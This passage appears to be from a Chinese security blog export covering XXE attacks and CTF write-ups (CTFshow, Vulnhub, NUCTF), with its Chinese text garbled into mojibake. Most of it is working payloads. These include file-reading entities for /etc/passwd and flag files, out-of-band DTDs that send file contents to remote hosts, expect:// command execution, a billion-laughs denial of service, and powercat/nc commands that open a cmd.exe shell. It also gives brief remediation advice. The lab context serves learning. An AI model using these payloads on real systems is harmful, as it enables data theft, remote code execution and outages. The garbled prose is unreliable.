%intï¼Œåœ¨xxe2.dtdæ–‡ä»¶å½“ä¸­å°†ä¼šè°ƒç”¨%fileï¼Œ%fileå°†ä¼šè·å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶222.txtï¼Œç„¶åå°†%fileï¼ˆæ•æ„Ÿæ–‡ä»¶å½“ä¸­çš„å†…å®¹ï¼‰å†™å…¥%sendå½“ä¸­(ç”±äºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  &amp;#37;)ï¼› æœ€åè°ƒç”¨ %send ï¼Œå°±ä¼šå°†æˆ‘ä»¬è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°è¿œç¨‹ vpsä¸Šï¼Œä¹Ÿå°±å®ç°äº† å¤–å¸¦æ•°æ® çš„æ•ˆæœï¼Œè§£å†³äº†xxeæ— å›æ˜¾çš„é—®é¢˜ã€‚ å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;/message&gt; 1xml.dtd:&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start; å¼•å…¥æœ¬åœ°æ–‡ä»¶ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; åµŒå¥—å‚æ•°å®ä½“ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt; %start; %send;]&gt;&lt;message&gt;10&lt;/message&gt; ä¸‰å±‚åµŒå¥—å‚æ•°å®ä½“ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &#x27; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#x27;&gt; %para;]&gt;&lt;message&gt;10&lt;/message&gt; æ›´å¤šç»•è¿‡å§¿åŠ¿ HTTP å†…ç½‘ä¸»æœºæ¢æµ‹ â€“ ç«¯å£æ‰«æ1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:8080/&quot; [ ]&gt;&lt;data&gt;4&lt;/data&gt; å¯ç»“åˆ burp çˆ†ç ´æ¨¡å— RCE : PHP expectæ¨¡å—å¼€å¯æ¡ä»¶ï¼šå®‰è£… expectæ‰©å±•çš„æƒ…å†µä¸‹ï¼Œåœ¨PHPç¯å¢ƒå½“ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ELEMENT ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; 1&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)... Dosæ”»å‡»1&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚ UNIX ä¸‹ï¼š 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨/dev/randomæ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚ 3.1.3 Pikachuè¯»å–æ–‡ä»¶ï¼ˆæ•æ„Ÿï¼‰ æµ‹è¯•ç¯å¢ƒï¼šPikachu æœ‰å›æ˜¾ ç›´æ¥è¯»å–æœ¬åœ°æ–‡ä»¶è¿›è¡Œæµ‹éªŒ 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///d:/test.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; å¼•å…¥å¤–éƒ¨å®ä½“ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://xxe/1.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt; 11.dtd:&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; phpä¼ªåè®® 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; åˆ©ç”¨phpæ‰©å±• expect æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ â€” RCE 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/xxe&gt; æ— å›æ˜¾ Payload1: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxe/4.dtd&quot;&gt;%dtd;%send;]&gt; 14.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload; Payload2: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt; 1xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999/?p=%file;&#x27;&gt;&quot;&gt; ç«¯å£ç›‘å¬ æ—¥å¿—çš„è¯»å–/æ–‡ä»¶çš„æ¥æ”¶ä»£ç  æˆ–è€…æ˜¯ å¼€å¯ç«¯å£ç›‘å¬ æ—¥å¿—æŸ¥çœ‹ ç¯å¢ƒï¼šwin-2003 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.158.115/xxe/3.dtd&quot;&gt;%dtd;%send;]&gt; 13.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload; 3.1.4 xxe-lab1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 3.1.5 xlsx æ–‡ä»¶æ”»å‡»xlsx æ–‡ä»¶ä¸Šä¼  3.2 ç»•è¿‡æ–¹å¼å‚è€ƒ https://xz.aliyun.com/t/4059 3.3 æ£€æµ‹ å·¥å…· äººå·¥ æ•°æ®æ ¼å¼ç±»å‹åˆ¤æ–­ Content-Typeå€¼åˆ¤æ–­ text/xml application/xml ç›²çŒœï¼šæ›´æ”¹Content-Typeå€¼å°è¯• 3.4 å·¥å…·XXEinjector(Ruby) å®‰è£… ä½¿ç”¨ 3.5 ç»ƒé¢˜3.5.1 CTF show373 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;&#125;highlight_file(__FILE__); 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE user [&lt;!ENTITY all SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;ctfshow&gt;&amp;all;&lt;/ctfshow&gt;&lt;/user&gt; 374 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 1&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag&quot;&gt;&lt;!ENTITY % hack SYSTEM &quot;http://xxe/test.dtd&quot;&gt;%hack;%dtd;%xxe; 1test.dtd:&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://xxe:3333/%file;&#x27;&gt; &quot;&gt;%dtd;%xxe; å¼•ç”¨%hackåè°ƒç”¨å¤–éƒ¨æ–‡ä»¶ï¼Œåè°ƒç”¨%dtdå¼•å…¥åµŒå¥—çš„payloadåå¼•ç”¨%xxeæ¥æ”¶æ•°æ® ç›‘å¬ç«¯å£ 1python2è¯­æ³•ï¼špython -m SimpleHTTPServer python3è¯­æ³•ï¼špython -m http.server 375 1error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;); &#125; if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; highlight_file(__FILE__); 376 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/i&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 377 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;|http/i&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 3.5.2 ä¿®æ”¹ Content-Typeç±»å‹ä¸€èˆ¬å¯¹äºwebæœåŠ¡æ¥è¯´ï¼Œæœ€å¸¸è§çš„æ•°æ®æ ¼å¼éƒ½æ˜¯XMLå’ŒJSONã€‚å°½ç®¡webæœåŠ¡å¯èƒ½åœ¨ç¼–ç¨‹æ—¶åªä½¿ç”¨å…¶ä¸­ä¸€ç§æ ¼å¼ï¼Œä½†æœåŠ¡å™¨å´å¯ä»¥æ¥å—å¼€å‘äººå‘˜å¹¶æ²¡æœ‰é¢„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œè¿™å°±æœ‰å¯èƒ½ä¼šå¯¼è‡´JSONèŠ‚ç‚¹å—åˆ°XXEï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰æ”»å‡»ã€‚ é¢˜ç›®é“¾æ¥ 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 3.5.3 å¼•å…¥æœ¬åœ° dtd æ–‡ä»¶é¢˜ç›®é“¾æ¥ 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt;]&gt;&lt;message&gt;1234010123502402340&lt;/message&gt; 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; Exploiting XXE to retrieve data by repurposing a local DTD[2] è¿™ä¸ª payload ä¸»è¦æ˜¯åˆ©ç”¨ é”™è¯¯ä¿¡æ¯æ¥æ‰“å°ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œé‡æ–°å®šä¹‰äº† docbookx.dtd ï¼ˆä¸€èˆ¬æœ‰ Gnome å°±æœ‰å®ƒï¼‰é‡Œé¢çš„ ISOamsoã€‚æˆ‘ä»¬æäº¤äº†è¿™ä¸ª payload ä¹‹åï¼Œå½“å¯¼å…¥æœ¬åœ°çš„ DTD æ–‡ä»¶æ—¶ï¼Œä¼šä¼˜å…ˆæ‰§è¡Œæˆ‘ä»¬å®šä¹‰çš„ ISOamsoï¼Œå› æ­¤å¯ä»¥è¾¾æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚ 3.5.4 VulnhubVulnhub ç¡®å®š IP 1kali:nmap -sS 192.168.158.0/24nmap -sV -p- 192.168.158.121 ç›®å½•æ‰«æ 1dirb http://192.168.158.121 1User-agent: *Allow: /User-Agent: *Disallow: /xxe/*Disallow: /admin.php XXE 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt; admin.php 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt; 1&lt;?php session_start();?&gt;&lt;html lang = &quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt; &lt;style&gt; body &#123; padding-top: 40px; padding-bottom: 40px; background-color: #ADABAB; &#125; .form-signin &#123; max-width: 330px; padding: 15px; margin: 0 auto; color: #017572; &#125; .form-signin .form-signin-heading, .form-signin .checkbox &#123; margin-bottom: 10px; &#125; .form-signin .checkbox &#123; font-weight: normal; &#125; .form-signin .form-control &#123; position: relative; height: auto; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; padding: 10px; font-size: 16px; &#125; .form-signin .form-control:focus &#123; z-index: 2; &#125; .form-signin input[type=&quot;email&quot;] &#123; margin-bottom: -1px; border-bottom-right-radius: 0; border-bottom-left-radius: 0; border-color:#017572; &#125; .form-signin input[type=&quot;password&quot;] &#123; margin-bottom: 10px; border-top-left-radius: 0; border-top-right-radius: 0; border-color:#017572; &#125; h2&#123; text-align: center; color: #017572; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;Enter Username and Password&lt;/h2&gt; &lt;div class = &quot;container form-signin&quot;&gt; &lt;?php $msg = &#x27;&#x27;; if (isset($_POST[&#x27;login&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;]) &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123; if ($_POST[&#x27;username&#x27;] == &#x27;administhebest&#x27; &amp;&amp; md5($_POST[&#x27;password&#x27;]) == &#x27;e6e061838856bf47e1de730719fb2609&#x27;) &#123; $_SESSION[&#x27;valid&#x27;] = true; $_SESSION[&#x27;timeout&#x27;] = time(); $_SESSION[&#x27;username&#x27;] = &#x27;administhebest&#x27;; echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;; $flag = &quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;; echo $flag; &#125;else &#123; $msg = &#x27;Maybe Later&#x27;; &#125; &#125; ?&gt; &lt;/div&gt; &lt;!-- W00t/W00t --&gt; &lt;div class = &quot;container&quot;&gt; &lt;form class = &quot;form-signin&quot; role = &quot;form&quot; action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot; method = &quot;post&quot;&gt; &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt; &lt;input type = &quot;text&quot; class = &quot;form-control&quot; name = &quot;username&quot; required autofocus&gt;&lt;/br&gt; &lt;input type = &quot;password&quot; class = &quot;form-control&quot; name = &quot;password&quot; required&gt; &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot; name = &quot;login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session. &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 3.6 ä¿®å¤å»ºè®®ï¼ˆ1ï¼‰ç¦æ­¢ä½¿ç”¨å¤–éƒ¨å®ä½“ï¼Œä¾‹å¦‚ libxml_disable_entity_loader(true) ï¼ˆ2ï¼‰è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ï¼Œé˜²æ­¢å‡ºç°éæ³•å†…å®¹ï¼Œå¦‚å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYæˆ–è€…SYSTEMå’ŒPUBLICç­‰ ï¼ˆ3ï¼‰æ£€æŸ¥æ‰€ä½¿ç”¨çš„åº•å±‚XMLè§£æåº“ï¼Œé»˜è®¤ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æ ï¼ˆ4ï¼‰è‹¥ä½¿ç”¨ç¬¬ä¸‰æ–¹åº”ç”¨ä»£ç éœ€è¦åŠæ—¶å‡çº§è¡¥ä¸ 1PHPï¼šlibxml_disable_entity_loader(true);JAVA:DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonï¼šfrom lxml import etreexmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) nmap 3.7 å‚è€ƒXXE : https://xz.aliyun.com/t/3357#toc-17 XXE : https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ PHP-dom : https://www.runoob.com/php/php-xml-parser-expat.html èœé¸Ÿæ•™ç¨‹~XMLï¼š https://www.runoob.com/xml/xml-tutorial.html èœé¸Ÿæ•™ç¨‹~DTDï¼š https://www.runoob.com/dtd/dtd-tutorial.html https://www.cnblogs.com/20175211lyz/p/11413335.html XML Schema èœé¸Ÿæ•™ç¨‹ ä½¿ç”¨ XML Schema æ”»å‡» XSLT æ”»å‡» (xxe) https://www.cnblogs.com/AtesetEnginner/p/11261653.html Windowsä¸Šçš„powercatæ­£å‘è¿æ¥Kaliä¸Šçš„nc 1kali:192.168.158.111 nc -lvvp 4444 win-10:192.168.158.110 powercat -c 192.168.158.111 -p 4444 -e cmd.exe kaliä¸Šçš„ncåå‘é“¾æ¥åˆ°windowsä¸Šçš„powercat 1kali:192.168.158.111 nc -vv 192.168.158.110 4444 win-10:192.168.158.110 powercat -l -p 4444 -e cmd.exe","categories":[{"name":"Webæ¼æ´åŸºç¡€ç¯‡","slug":"Webæ¼æ´åŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"xizhi-future"},{"title":"NUCTF","slug":"NUCTF","date":"2021-06-24T11:24:20.000Z","updated":"2021-07-12T04:40:08.086Z","comments":true,"path":"2021/06/24/NUCTF/","link":"","permalink":"https://xizhi-future.github.io/2021/06/24/NUCTF/","excerpt":"æ¦‚è¿°ï¼šä¸»è¦è€ƒç‚¹ â€” åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸","text":"æ¦‚è¿°ï¼šä¸»è¦è€ƒç‚¹ â€” åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ NUCTF1 EasyUnser12345678910111213141516171819&lt;?php include_once &#x27;flag.php&#x27;;highlight_file(__FILE__);// Security filtering function function filter($str)&#123; return str_replace(&#x27;secure&#x27;, &#x27;secured&#x27;, $str); &#125; class Hacker&#123; public $username = &#x27;margin&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; // Security filtering $h-&gt;username = $_POST[&#x27;username&#x27;]; $c = unserialize(filter(serialize($h))); if ($c-&gt;password === &#x27;hacker&#x27;)&#123; echo $flag; &#125; &#125; åˆ†æï¼š POST ä¼ å…¥å‚æ•° username å’Œ password é¢˜ç›®åˆå§‹åŒ– public $password = &#39;margin123&#39;; ï¼Œè€Œè¦æƒ³è·å– flag å¿…é¡»ä½¿ password ä¸º hacker æ ¹æ® PHP ååºåˆ—åŒ–æ—¶é‡åˆ° ;&#125; å³ååºåˆ—åŒ–ç»“æŸï¼Œæˆ‘ä»¬ä¼ å…¥ username ä¸º margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125; ï¼Œå¸Œæœ›åŸæœ¬åˆå§‹åŒ–çš„ password çš„å€¼ margin123 å¤±æ•ˆï¼ˆè¢«é¡¶å‡ºå»ï¼‰ 123456789 &lt;?php class Hacker&#123; public $username = &#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); echo serialize($h);# å¾—åˆ° O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125; 1234567&lt;?php class Hacker&#123; public $username = &#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); print_r(unserialize($h); å¦‚æœæˆ‘ä»¬å°†ä¸Šé¢çš„å¾—åˆ°çš„å†…å®¹è¿›è¡Œ ååºåˆ—åŒ–è¾“å‡ºï¼Œç»“æœå°†ä¼šæŠ¥é”™ï¼›è¿™æ˜¯å› ä¸º s:37:&quot;margin&quot;; è¿™é‡ŒæŒ‰é“ç†åº”è¯¥æ˜¯ s:6:&quot;margin&quot;;ï¼Œä½†ç”±äºæˆ‘ä»¬éœ€è¦æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•å°†åé¢çš„ &quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125; æŒ¤æ‰ï¼Œå› æ­¤å®é™…ä¸Šä¼ å…¥çš„é•¿åº¦æ˜¯37ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†è¿™37ä¸ªé•¿åº¦è¡¥é½ï¼Œè¿˜éœ€è¦å¤šä¼ å…¥ 31ä¸ªé•¿åº¦ï¼› é¢˜ç›®ä¸­çš„ filter å‡½æ•°å³æ˜¯å°† secuer æ›¿æ¢ä¸º secured ï¼Œä¸€ä¸ª secured æ¯” secure å¤šä¸€ä¸ªé•¿åº¦ï¼Œé‚£ä¹ˆ 31ä¸ª secure å°±ä¼šå¤šå‡º 31ä¸ªé•¿åº¦ï¼Œä»è€Œå¯¼è‡´å­—ç¬¦å¢åŠ  123456789101112131415 &lt;?php class Hacker&#123; public $username = &#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); echo serialize($h);# è¾“å‡º 